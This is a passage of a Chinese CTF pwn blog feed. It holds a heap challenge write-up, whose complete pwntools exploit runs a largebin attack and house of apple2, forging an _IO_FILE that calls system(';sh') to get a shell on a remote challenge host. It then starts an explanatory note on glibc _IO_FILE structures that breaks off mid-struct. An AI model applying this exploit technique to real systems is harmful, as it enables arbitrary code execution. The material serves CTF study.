function_">Exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)ptr[i]);</span><br><span class="line">      ptr[i] = <span class="number">0LL</span>;</span><br><span class="line">      ptr_size[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以主动触发exit();<br>例行公事，checksec一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/2.39$ checksec heap</span><br><span class="line">[*] &#x27;/home/r3t2/2.39/heap&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>此题可以申请16个chunk进行操作。限制很少，总体思路是利用unsortedbin leak泄露libc地址，heap_base也可以直接打印largebin中的chunk的<code>fd_nextsize</code>来泄露，然后largebin attack来向<code>_IO_list_all</code>写入堆地址，接着利用可控的chunk来伪造一个fake_io_file，打house of apple2。本题io链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_OVERFLOW(fp, ch) </span><br><span class="line">  └→ __overflow → _IO_wfile_overflow  </span><br><span class="line">    └→ _IO_wdoallocbuf  </span><br><span class="line">      └→ _IO_WDOALLOCATE(fp)  </span><br><span class="line">         └→ WJUMP0(__doallocate, fp)  </span><br><span class="line">            └→ 调用 fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate(fp)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./heap&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28176</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content : \n&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">creat(<span class="number">1</span>,<span class="number">0x508</span>) <span class="comment">#防止被topchunk合并,同时用于覆盖fake_io_file的_flag位</span></span><br><span class="line">creat(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">creat(<span class="number">3</span>,<span class="number">0x500</span>) <span class="comment">#防止被topchunk合并</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">leak_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">96</span>-<span class="number">0x203ac0</span> <span class="comment">#0x203ac0是直接ida中查看对应libc文件的malloc_trim函数得到的main_arena的偏移</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">target_addr=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="number">4</span>,<span class="number">0x900</span>) <span class="comment"># chunk0进入largebin，用于泄露堆基址，并为largebin attack做准备</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">leak_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base=((leak_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)</span><br><span class="line">log.success(<span class="string">&quot;heap_base--&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(target_addr-<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">creat(<span class="number">5</span>,<span class="number">0x900</span>) <span class="comment">#chunk2作为fake_io_file进入largebin，完成largebin attack，_IO_list_all指向chunk2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x500</span>+p32(<span class="number">0xfbadf7f5</span>)+<span class="string">b&#x27;;sh\x00&#x27;</span>) <span class="comment">#利用presize复用来控制fake_io_file的_flags，同时写入&#x27;;sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">chunk_addr=heap_base+<span class="number">0x290</span>+<span class="number">0x530</span>+<span class="number">0x510</span> <span class="comment">#fake_io_file的地址</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_file = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x100</span>) <span class="comment">#wide_data</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#mode</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(io_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x200</span>) <span class="comment">#_wide_data-&gt;_wide_vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x200</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) * <span class="number">13</span> + p64(system) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_file)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于_IO_FILE</title>
      <link href="/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/"/>
      <url>/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>总结记录一下<code>_IO_FILE</code>的基础知识<br>参考博客<br><a href="https://blog.csdn.net/qq_45323960/article/details/123810198?spm=1001.2014.3001.5501">linux IO_FILE 利用_io list all结构体-CSDN博客</a><br><a href="https://loora1n.github.io/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/">【IO_FILE】源码详解 | Loora1N’s Blog | 鹭雨</a><br><a href="https://wiki.wgpsec.org/knowledge/ctf/iofile.html">【PWN】iofile | 狼组安全团队公开知识库</a><br></p><h2 id="0x01-IO-FILE结构"><a href="#0x01-IO-FILE结构" class="headerlink" title="0x01 _IO_FILE结构"></a>0x01 _IO_FILE结构</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 结构定义在 libio.h 中，如下所示<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的第一个成员<code>_flags</code>是一个非常重要且关键的值。其高两个字节是<code>_IO_MAGIC</code>（一个宏，其值为0xFBAD0000），用于检查<code>_IO_file</code>的合法性。glibc中存在的检查如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="comment">/*glibc中一个用于检查的宏如下*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;</span></span><br><span class="line">    <span class="keyword">if</span> ((FILE) == <span class="literal">NULL</span> ||</span><br><span class="line">        ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) &#123;</span><br><span class="line">        __set_errno (EINVAL);</span><br><span class="line">        <span class="keyword">return</span> RET;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="comment">/*glibc 在遍历 _IO_list_all （全局 FILE 链表）进行 flush/unbuffer 操作时，通常使用如下方式过滤不合法的文件*/</span></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) …)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>_flags</code>的低二字节，也就是低16bit是一个状态码，用于控制控制 FILE 的读写状态、缓存、put&#x2F;get 模式、错误状态等<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000    <span class="comment">/* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000      <span class="comment">/* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1                 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4                 <span class="comment">/* Reading not allowed 不允许读取操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10              <span class="comment">/* EOF seen 已经到达文件结尾（EOF） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20              <span class="comment">/* Error seen 已经发生错误 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40     <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80                <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100            <span class="comment">/* In backup 处于备份模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400         <span class="comment">/* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000          <span class="comment">/* Is file buffer 是一个文件缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000            <span class="comment">/* Bad seen 遇到错误（bad flag set） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000           <span class="comment">/* User lock 用户锁定，防止其他线程访问 */</span></span></span><br></pre></td></tr></table></figure><p><code>_IO_read_ptr</code>正在使用的input缓冲区的input地址<br><code>_IO_read_end</code> input缓冲区的结束地址<br><code>_IO_read_base</code> input缓冲区的基址<br><code>_IO_write_base</code> output缓冲区的基址<br><code>_IO_write_ptr</code> 指向还没输出的那个字节<br><code>_IO_write_end</code> output缓冲区的结束地址<br><code>_IO_buf_base</code> input和output缓冲区的基址<br><code>_IO_buf_end</code> input和output缓冲区的结束地址<br><code>_chain</code> 为<code>_IO_FILE *</code>类型，存放着一个单链表，用于串联所有的file stream（其实就是<code>_IO_FILE</code>结构体），表头通过<code>_IO_list_all</code>指针访问，注意<code>_IO_list_all</code>便是<code>_IO_FILE_plus *</code>类型的。结构如下所示<br></p><p><img src="/images/ea5063408b268d86b52ecebe0894e2b9.png"></p><p><code>_fileno</code> 与文件相关的文件描述符（例如stdin为0，stdout为1，stderr为2）<br><code>_vtable_offset</code> 存放虚表(virtual table)的偏移<br><code>_offset</code> 存放当前文件的偏移<br>至于vtable，为函数指针结构体，存放着各种 IO 相关的函数的指针，可以在另一个结构体<code>_IO_FILE_plus</code>中看到。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_jump_t</code>定义如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    